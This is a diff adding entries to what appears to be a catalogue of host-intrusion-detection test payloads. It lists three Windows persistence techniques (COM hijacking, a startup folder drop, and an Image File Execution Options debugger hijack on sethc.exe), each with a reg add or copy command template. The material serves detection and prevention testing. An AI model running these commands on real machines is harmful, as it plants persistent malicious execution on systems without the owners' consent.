+    "payload_name": "Host Persistence: COM Hijacking",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-028",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "HKCU\\\\Software\\\\Classes\\\\CLSID\\\\... 替换合法 DLL 路径。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1546.015"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "registry",
+    "hids_command_template": "reg add HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{12345678-1234-1234-1234-123456789012}\\\\InProcServer32 /d \"C:\\\\evil.dll\" /f",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "reg_write:CLSID_hijack"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: Startup folder",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-029",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\ 落 .lnk。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1547.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "copy evil.exe \"%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\Updater.exe\"",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_create:startup_lnk"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: Image File Execution",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-030",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "IFEO Debugger 劫持（每次执行特定 .exe 都跑 debugger 路径）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1546.012"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "registry",
+    "hids_command_template": "reg add \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\\\evil.exe\" /f",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "reg_write:IFEO"
+    ]
+  }
+]
